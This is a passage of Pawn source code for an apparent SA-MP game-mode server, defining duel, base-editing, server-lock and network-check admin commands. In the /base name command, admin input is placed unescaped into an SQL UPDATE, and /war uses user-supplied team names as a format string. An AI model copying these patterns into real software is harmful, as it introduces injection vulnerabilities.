	SetPlayerInterior(pID, 1);
	Player[pID][challengerid] = playerid;
	Player[pID][InDuel] = true;
	Player[pID][TeamBeforeDuel] = Player[pID][Team];
	Player[pID][Team] = REFEREE;
	SetPlayerColor(pID, 0xFF880088);
	SetPlayerSkin(pID, Skin[Player[pID][Team]]);
	PlayerPlaySound(pID,3200,0.0,0.0,0.0);
	Player[pID][ToAddInRound] = false;

	SetDuelSignText(playerid, pID);
	return 1;
}


CMD:no(playerid, params[])
{
	new pID, iString[180];
	pID = Player[playerid][challengerid];

	if(Player[playerid][challengerid] == -1) return SendErrorMessage(playerid,"No one has invited you to a duel.");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

	format(iString, sizeof(iString), "%s%s {FFFFFF}denied the duel challenge by %s%s", TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[pID][Team]], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);

	Player[playerid][challengerid] = -1;

	return 1;
}

CMD:rq(playerid, params[])
{
	if(Player[playerid][InDuel] == false) {
		return SendErrorMessage(playerid,"You are not in a duel");

	} else {
		new pID, iString[180], Float:HPs[2];
		GetHP(playerid, HPs[0]);
		GetAP(playerid, HPs[1]);
		pID = Player[playerid][challengerid];

		format(iString, sizeof(iString), "%s%s {FFFFFF}rage-quitted from a duel | {CCCCCC}HP %.0f | Armour %.0f", TextColor[Player[playerid][Team]], Player[playerid][Name], HPs[0], HPs[1]);
		SendClientMessageToAll(-1,iString);

		Player[playerid][InDuel] = false;
		Player[pID][InDuel] = false;
        ResetDuellersToTheirTeams(playerid, pID);

		Player[playerid][challengerid] = -1;
		Player[pID][challengerid] = -1;

		return 1;
	}
}

CMD:limit(playerid, params[])
{
    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 5 or rcon admin.");

	new Command[64], aLimit, CommandID, iString[180];
	if(sscanf(params, "sd", Command, aLimit)) return SendUsageMessage(playerid,"/limit [weather | time] [Limit]");

	if(strcmp(Command, "weather", true) == 0) CommandID = 1;
	else if(strcmp(Command, "time", true) == 0) CommandID = 2;
	else return SendUsageMessage(playerid,"/limit [weather | time] [Limit]");

    if(aLimit < 10 || aLimit > 9999) return SendErrorMessage(playerid,"Invalid limit.");

	switch(CommandID) {
	    case 1: { //Weather
			WeatherLimit = aLimit;

			foreach(new i : Player) {
			    if(Player[i][Weather] > WeatherLimit) {

					Player[i][Weather] = 0;
					SetPlayerWeather(i, Player[i][Weather]);

					format(iString, sizeof(iString), "UPDATE Players SET Weather = %d WHERE Name = '%s'", Player[i][Weather], DB_Escape(Player[i][Name]));
				    db_free_result(db_query(sqliteconnection, iString));
				}
			}

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed weather limit to: {FFFFFF}%d", Player[playerid][Name], WeatherLimit);
			SendClientMessageToAll(-1, iString);

	    } case 2: { //Time
	        TimeLimit = aLimit;

	        foreach(new i : Player) {
				if(Player[i][Time] > TimeLimit) {

				    Player[i][Time] = 12;
				    SetPlayerTime(playerid, Player[i][Time], 12);

					format(iString, sizeof(iString), "UPDATE Players SET Time = %d WHERE Name = '%s'", Player[i][Time], DB_Escape(Player[i][Name]));
				    db_free_result(db_query(sqliteconnection, iString));
				}
			}

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed time limit to: {FFFFFF}%d",Player[playerid][Name], TimeLimit);
			SendClientMessageToAll(-1, iString);
	    }
	}
	LogAdminCommand("limit", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:config(playerid, params[]) {
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 5 or rcon admin.");

	ShowConfigDialog(playerid);
    LogAdminCommand("config", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:textdraw(playerid, params[])
{
	if(Player[playerid][TextPos] == true) {
	    Player[playerid][TextPos] = false;
		SendClientMessage(playerid, -1, "Widescreen textdraw disabled.");
	} else {
	    Player[playerid][TextPos] = true;
		SendClientMessage(playerid, -1, "Widescreen textdraw enabled.");
	}

    HPArmourBaseID_VS_TD(playerid);

    PlayerTextDrawShow(playerid, HPTextDraw_TD);
    PlayerTextDrawShow(playerid, ArmourTextDraw);
	PlayerTextDrawShow(playerid, BaseID_VS);
	ShowPlayerProgressBar(playerid, HealthBar);
	ShowPlayerProgressBar(playerid, ArmourBar);

	new iString[160];
	if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

	format(iString, sizeof(iString), "UPDATE Players SET Widescreen = %d WHERE Name = '%s'", (Player[playerid][TextPos] == true ? 1 : 0), DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));
	return 1;
}


CMD:base(playerid, params[])
{
	if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 5 or rcon admin.");
    if(Current != -1) return SendErrorMessage(playerid,"Can't use this command while round is active.");

	new Params[2][64], BaseName[128], iString[256], CommandID;
	if(sscanf(params, "szz", Params[0], Params[1], BaseName)) return SendUsageMessage(playerid,"/base [create | att | def | cp | name | delete]");

	if(strcmp(Params[0], "create", true) == 0) CommandID = 1;
	else if(strcmp(Params[0], "att", true) == 0) CommandID = 2;
	else if(strcmp(Params[0], "def", true) == 0) CommandID = 3;
	else if(strcmp(Params[0], "cp", true) == 0) CommandID = 4;
	else if(strcmp(Params[0], "name", true) == 0) CommandID = 5;
	else if(strcmp(Params[0], "delete", true) == 0) CommandID = 6;
	else return SendUsageMessage(playerid,"/base [create | att | def | cp | name | delete]");

	switch(CommandID) {
	    case 1: {
	        format(iString, sizeof(iString), "SELECT ID FROM Bases ORDER BY `ID` DESC LIMIT 1");
			new DBResult:res = db_query(sqliteconnection, iString);

			new BaseID;
			if(db_num_rows(res)) {
				db_get_field_assoc(res, "ID", iString, sizeof(iString));
	    		BaseID = strval(iString)+1;
		    }
		    db_free_result(res);

		    if(BaseID > MAX_BASES) return SendErrorMessage(playerid,"Too many bases already created.");

			format(iString, sizeof(iString), "INSERT INTO Bases (ID, AttSpawn, CPSpawn, DefSpawn, Interior, Name) VALUES (%d, 0, 0, 0, 0, 'No Name')", BaseID);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has created {FFFFFF}Base ID: %d", Player[playerid][Name], BaseID);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
	    } case 2: {
	        if(isnull(Params[1]) || !IsNumeric(Params[1])) return SendUsageMessage(playerid,"/base [att] [Base ID]");

			new baseid;
			baseid = strval(Params[1]);

			if(baseid > MAX_BASES) return SendErrorMessage(playerid,"That base doesn't exist.");
			if(!BExist[baseid]) return SendErrorMessage(playerid,"That base doesn't exist.");

			new Float:P[3], PositionA[128];
			GetPlayerPos(playerid, P[0], P[1], P[2]);
			format(PositionA, sizeof(PositionA), "%.0f,%.0f,%.0f", P[0], P[1], P[2]);

			format(iString, sizeof(iString), "UPDATE Bases SET AttSpawn = '%s' WHERE ID = %d", PositionA, baseid);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has configured Attacker position for {FFFFFF}Base ID: %d", Player[playerid][Name], baseid);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
	    } case 3: {
	        if(isnull(Params[1]) || !IsNumeric(Params[1])) return SendUsageMessage(playerid,"/base [def] [Base ID]");

			new baseid;
			baseid = strval(Params[1]);

			if(baseid > MAX_BASES) return SendErrorMessage(playerid,"That base doesn't exist.");
			if(!BExist[baseid]) return SendErrorMessage(playerid,"That base doesn't exist.");

			new Float:P[3], PositionB[128];
			GetPlayerPos(playerid, P[0], P[1], P[2]);
			format(PositionB, sizeof(PositionB), "%.0f,%.0f,%.0f", P[0], P[1], P[2]);

			format(iString, sizeof(iString), "UPDATE Bases SET DefSpawn = '%s' WHERE ID = %d", PositionB, baseid);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has configured Defender position for {FFFFFF}Base ID: %d", Player[playerid][Name], baseid);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
	    } case 4: {
	        if(isnull(Params[1]) || !IsNumeric(Params[1])) return SendUsageMessage(playerid,"/base [cp] [Base ID]");

			new baseid;
			baseid = strval(Params[1]);

			if(baseid > MAX_BASES) return SendErrorMessage(playerid,"That base doesn't exist.");
			if(!BExist[baseid]) return SendErrorMessage(playerid,"That base doesn't exist.");

			new Float:P[3], cp[128];
			GetPlayerPos(playerid, P[0], P[1], P[2]);
			format(cp, sizeof(cp), "%.0f,%.0f,%.0f", P[0], P[1], P[2]);

			format(iString, sizeof(iString), "UPDATE Bases SET CPSpawn = '%s', Interior = %d WHERE ID = %d", cp, GetPlayerInterior(playerid), baseid);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has configured CP/Interior position for {FFFFFF}Base ID: %d", Player[playerid][Name], baseid);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
	    } case 5: {
	        if(isnull(Params[1]) || !IsNumeric(Params[1])) return SendUsageMessage(playerid,"/base [name] [Base ID] [Name]");
			if(isnull(BaseName)) return SendUsageMessage(playerid,"/base [name] [Base ID] [Name]");

			new baseid;
			baseid = strval(Params[1]);

			if(baseid > MAX_BASES) return SendErrorMessage(playerid,"That base doesn't exist.");
			if(!BExist[baseid]) return SendErrorMessage(playerid,"That base doesn't exist.");

			format(iString, sizeof(iString), "UPDATE Bases SET Name = '%s' WHERE ID = %d", BaseName, baseid);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has configured Name for {FFFFFF}Base ID: %d", Player[playerid][Name], baseid);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
	    } case 6: {
	        if(isnull(Params[1]) || !IsNumeric(Params[1])) return SendUsageMessage(playerid,"/base [delete] [Base ID]");

			new baseid;
			baseid = strval(Params[1]);

			if(baseid > MAX_BASES) return SendErrorMessage(playerid,"That base doesn't exist.");
			if(!BExist[baseid]) return SendErrorMessage(playerid,"That base doesn't exist.");

			format(iString, sizeof(iString), "DELETE FROM Bases WHERE ID = %d", baseid);
			db_free_result(db_query(sqliteconnection, iString));

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has deleted {FFFFFF}Base ID: %d", Player[playerid][Name], baseid);
			SendClientMessageToAll(-1, iString);

			LoadBases();
			return 1;
		}
	}
	return 1;
}

CMD:weaponlimit(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
    ShowWepLimit(playerid);
    LogAdminCommand("weaponlimit", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:permlock(playerid, params[])
{
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	if(ServerLocked == false)
	{
	    SendErrorMessage(playerid,"Server must be locked first. Use /lock !");
	}
	else
	{
		new iString[128];
	    if(PermLocked == true)
		{
			PermLocked = false;
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled the server permanent lock!",Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		}
		else
		{
		    PermLocked = true;
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has made the server lock permanent!",Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		}
	}
	LogAdminCommand("permlock", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:lock(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	new iString[128];
	if(ServerLocked == false) {

	    if(isnull(params)) return SendUsageMessage(playerid,"/lock [Password]");
		if(strlen(params) > MAX_SERVER_PASS_LENGH) return SendErrorMessage(playerid,"Server password is too long.");

        format(ServerPass, sizeof(ServerPass), "password %s", params);
        SendRconCommand(ServerPass);

		ServerLocked = true;
		PermLocked = false;

		format(iString, sizeof(iString), "%sServer Pass: ~r~%s", MAIN_TEXT_COLOUR, params);
		TextDrawSetString(LockServerTD, iString);

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has locked the server. Password: {FFFFFF}%s",Player[playerid][Name], params);
		SendClientMessageToAll(-1, iString);

	} else {

		SendRconCommand("password 0");
		TextDrawSetString(LockServerTD, sprintf("%sServer: ~r~Unlocked", MAIN_TEXT_COLOUR));

		ServerLocked = false;
		PermLocked = false;

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unlocked the server.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);
	}
    LogAdminCommand("lock", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:unlock(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(ServerLocked == false) return SendErrorMessage(playerid,"Server is not locked.");

	new iString[160];
	SendRconCommand("password 0");
	TextDrawSetString(LockServerTD, sprintf("%sServer: ~r~Unlocked", MAIN_TEXT_COLOUR));

	ServerLocked = false;
	PermLocked = false;

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unlocked the server.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("unlock", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:resetscores(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	new iString[160];

    TeamScore[ATTACKER] = 0;
    TeamScore[DEFENDER] = 0;
    CurrentRound = 0;

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

	ClearPlayerVariables();

	foreach(new i : Player) {
	    for(new j = 0; j < 55; j ++)
			Player[i][WeaponStat][j] = 0;
		Player[i][TotalKills] = 0;
		Player[i][TotalDeaths] = 0;
		Player[i][TotalDamage] = 0;
		Player[i][RoundPlayed] = 0;
	    Player[i][TotalBulletsFired] = 0;
	    Player[i][TotalshotsHit] = 0;
	}

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has resetted the scores.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
	return 1;
}

CMD:view(playerid, params[])
{
	if(Current != -1) return SendErrorMessage(playerid,"Can't use while round is on.");

	new Params[64], Round, CommandID, iString[256];
	if(sscanf(params, "sd", Params, Round)) return SendUsageMessage(playerid,"/view [base | arena] [Round ID]");

	if(strcmp(Params, "base", true) == 0) CommandID = 1;
	else if(strcmp(Params, "arena", true) == 0) CommandID = 2;
	else return SendUsageMessage(playerid,"/view [base | arena] [Round ID]");

	if(Player[playerid][InDM] == true) {
	    Player[playerid][InDM] = false;
    	Player[playerid][DMReadd] = 0;
	}
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");

	Player[playerid][AntiLag] = false;

	if(Player[playerid][Spectating] == true) StopSpectate(playerid);

	Player[playerid][SpectatingRound] = Round;
	switch (CommandID) {
	    case 1: { //base
			if(Round > MAX_BASES) return SendErrorMessage(playerid,"That base does not exist.");
			if(!BExist[Round]) return SendErrorMessage(playerid,"That base does not exist.");

	        SetPlayerInterior(playerid, BInterior[Round]);
			SetPlayerCameraLookAt(playerid,BCPSpawn[Round][0],BCPSpawn[Round][1],BCPSpawn[Round][2]);
	   		SetPlayerCameraPos(playerid,BCPSpawn[Round][0]+100,BCPSpawn[Round][1],BCPSpawn[Round][2]+80);
			SetPlayerPos(playerid, BCPSpawn[Round][0], BCPSpawn[Round][1], BCPSpawn[Round][2]);

			Player[playerid][SpectatingType] = BASE;
			format(iString, sizeof(iString), "%sBase ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, BName[Round], Round, MAIN_TEXT_COLOUR);
			PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);

	    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"is spectating Base: {FFFFFF}%s (ID: %d)", Player[playerid][Name], BName[Round], Round);
	    } case 2: { // Arena
			if(Round > MAX_ARENAS) return SendErrorMessage(playerid,"That arena does not exist.");
			if(!AExist[Round]) return SendErrorMessage(playerid,"That arena does not exist.");

			SetPlayerCameraLookAt(playerid,ACPSpawn[Round][0],ACPSpawn[Round][1],ACPSpawn[Round][2]);
	   		SetPlayerCameraPos(playerid,ACPSpawn[Round][0]+100,ACPSpawn[Round][1],ACPSpawn[Round][2]+80);
			SetPlayerPos(playerid, ACPSpawn[Round][0], ACPSpawn[Round][1], ACPSpawn[Round][2]);
			SetPlayerInterior(playerid, AInterior[Round]);

			Player[playerid][SpectatingType] = ARENA;
			format(iString, sizeof(iString), "%sArena ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, AName[Round], Round, MAIN_TEXT_COLOUR);
			PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);

	    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"is spectating Arena: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[Round], Round);
	    }

	}
	SendClientMessageToAll(-1, iString);
	SendClientMessage(playerid, -1, "Switch between rounds using LMB & RMB. Go normal mode using /specoff. Press Jump key to spawn in CP.");
	Player[playerid][Spectating] = true;

	return 1;
}

CMD:netcheck(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/netcheck [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][Level] >= Player[playerid][Level] && pID != playerid) return SendErrorMessage(playerid,"That player is same or higher admin level than you.");


	new iString[180];
	if(Player[pID][NetCheck] == 1) {
	    Player[pID][NetCheck] = 0;
	    Player[pID][FPSCheck] = 0;
	    Player[pID][PingCheck] = 0;
	    Player[pID][PLCheck] = 0;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled Net-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	} else {
	    Player[pID][NetCheck] = 1;
	    Player[pID][FPSCheck] = 1;
	    Player[pID][PingCheck] = 1;
	    Player[pID][PLCheck] = 1;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has enabled Net-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	}
	SendClientMessageToAll(-1, iString);

	format(iString, sizeof(iString), "UPDATE Players SET NetCheck = %d WHERE Name = '%s'", Player[pID][NetCheck], DB_Escape(Player[pID][Name]));
    db_free_result(db_query(sqliteconnection, iString));
    
    LogAdminCommand("netcheck", playerid, pID);
	return 1;
}

CMD:fpscheck(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/fpscheck [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][NetCheck] == 0) return SendErrorMessage(playerid, "That player has netcheck disabled on him.");
	if(Player[pID][Level] >= Player[playerid][Level] && pID != playerid) return SendErrorMessage(playerid,"That player is same or higher admin level than you.");


	new iString[180];
	if(Player[pID][FPSCheck] == 1) {
	    Player[pID][FPSCheck] = 0;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled FPS-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	} else {
	    Player[pID][FPSCheck] = 1;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has enabled FPS-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	}
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("fpscheck", playerid, pID);
	return 1;
}

CMD:pingcheck(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/pingcheck [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][NetCheck] == 0) return SendErrorMessage(playerid, "That player has netcheck disabled on him.");
	if(Player[pID][Level] >= Player[playerid][Level] && pID != playerid) return SendErrorMessage(playerid,"That player is same or higher admin level than you.");


	new iString[180];
	if(Player[pID][PingCheck] == 1) {
	    Player[pID][PingCheck] = 0;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled Ping-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	} else {
	    Player[pID][PingCheck] = 1;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has enabled Ping-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	}
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("pingcheck", playerid, pID);
	return 1;
}

CMD:plcheck(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/plcheck [Player ID]");

	new pID = strval(params);
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[pID][NetCheck] == 0) return SendErrorMessage(playerid, "That player has netcheck disabled on him.");
	if(Player[pID][Level] >= Player[playerid][Level] && pID != playerid) return SendErrorMessage(playerid,"That player is same or higher admin level than you.");


	new iString[180];
	if(Player[pID][PLCheck] == 1) {
	    Player[pID][PLCheck] = 0;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has disabled PL-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	} else {
	    Player[pID][PLCheck] = 1;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has enabled PL-Check on: {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	}
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("plcheck", playerid, pID);
	return 1;
}

CMD:war(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(Current != -1) return SendErrorMessage(playerid,"Can't use this command while round is on.");

	new iString[160], TeamAName[24], TeamBName[24];
	if(sscanf(params, "sz", TeamAName, TeamBName)) return SendUsageMessage(playerid,"/war ([Team A] [Team B]) (end)");

	if(strcmp(TeamAName, "end", true) == 0 && isnull(TeamBName) && WarMode == true) {

		SetTimer("WarEnded", 5000, 0);
		SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has set the match to end!", Player[playerid][Name]));
		SendClientMessageToAll(-1, ""COL_PRIM"Preparing End Match Results..");
		SendClientMessageToAll(-1, ""COL_PRIM"If you missed the results screen by hiding the current textdraws, type {FFFFFF}/showagain");
        SendClientMessageToAll(-1, ""COL_PRIM"Type {FFFFFF}/weaponstats "COL_PRIM"to see a list of players weapon statistics.");

		return 1;
	} else if(isnull(TeamBName)) return SendUsageMessage(playerid,"/war ([Team A] [Team B]) (end)");


    if(WarMode == true) return SendErrorMessage(playerid,"War-mode is already on.");
	if(strlen(TeamAName) > 6 || strlen(TeamBName) > 6) return SendErrorMessage(playerid,"Team name is too long.");
	if(strfind(TeamAName, "~") != -1 || strfind(TeamBName, "~") != -1) return SendErrorMessage(playerid,"~ not allowed.");

	format(TeamName[ATTACKER], 24, TeamAName);
	format(TeamName[ATTACKER_SUB], 24, "%s Sub", TeamName[ATTACKER]);
	format(TeamName[DEFENDER], 24, TeamBName);
	format(TeamName[DEFENDER_SUB], 24, "%s Sub", TeamName[DEFENDER]);

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has enabled the Match-Mode.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

	MatchRoundsStarted = 0;
	for( new i = 0; i < 101; i++ )
	{
	    MatchRoundsRecord[ i ][ round__ID ] = -1;
	    MatchRoundsRecord[ i ][ round__type ] = -1;
	    MatchRoundsRecord[ i ][ round__completed ] = false;
	}

	WarMode = true;
	RoundPaused = false;
    format(iString, sizeof iString, "%sWar Mode: ~r~ON", MAIN_TEXT_COLOUR);
	TextDrawSetString(WarModeText, iString);

	new bool:PlayersToTeam[MAX_PLAYERS] = false;
	new PlayersAvailable;

	foreach(new i : Player) {
	    for(new j = 0; j < 55; j ++)
			Player[i][WeaponStat][j] = 0;
		Player[i][TotalKills] = 0;
		Player[i][TotalDeaths] = 0;
		Player[i][TotalDamage] = 0;
		Player[i][RoundPlayed] = 0;
	    Player[i][TotalBulletsFired] = 0;
	    Player[i][TotalshotsHit] = 0;


		if(Player[i][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
		else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[i][RoundKills], MAIN_TEXT_COLOUR, Player[i][RoundDamage], MAIN_TEXT_COLOUR, Player[i][TotalDamage]);
		PlayerTextDrawSetString(i, RoundKillDmgTDmg, iString);

		if(strfind(Player[i][Name], TeamName[ATTACKER], true) != -1 && (Player[i][Team] == ATTACKER || Player[i][Team] == DEFENDER)) {
  			PlayersAvailable++;
            PlayersToTeam[i] = true;
        }
    }

	if(PlayersAvailable > 1) {
		foreach(new i : Player) {

			new MyVehicle = -1;
			new Seat;

			if(IsPlayerInAnyVehicle(i)) {
				MyVehicle = GetPlayerVehicleID(i);
				Seat = GetPlayerVehicleSeat(i);
			}


			if(PlayersToTeam[i] == true) {
			    Player[i][Team] = ATTACKER;
			    SetPlayerColor(i, ATTACKER_NOT_PLAYING);
			} else {
				Player[i][Team] = DEFENDER;
				SetPlayerColor(i, DEFENDER_NOT_PLAYING);
			}
			SetPlayerSkin(i, Skin[Player[i][Team]]);
			ClearAnimations(i);


			if(MyVehicle != -1) {
			    PutPlayerInVehicle(i, MyVehicle, Seat);

				if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
					switch(Player[i][Team]) {
						case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(i), 175, 175);
						case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 158, 158);
						case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(i), 198, 198);
						case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 208, 208);
						case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(i), 200, 200);
					}
				}
			}

	    }
	}

	TextDrawShowForAll(RoundsPlayed);
	TextDrawShowForAll(TeamScoreText);
	return 1;
}


CMD:teamname(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	new iString[160], TeamID, TeamNamee[24];
	if(sscanf(params, "ds", TeamID, TeamNamee)) return SendUsageMessage(playerid,"/teamname [Team ID] [Name] (0 = Attacker | 1 = Defender)");

	if(TeamID < 0 || TeamID > 1) return SendErrorMessage(playerid,"Invalid Team ID.");
	if(strlen(TeamNamee) > 6) return SendErrorMessage(playerid,"Team name is too long.");
	if(strfind(TeamNamee, "~") != -1) return SendErrorMessage(playerid,"~ not allowed.");

	switch(TeamID) {
	    case 0: {
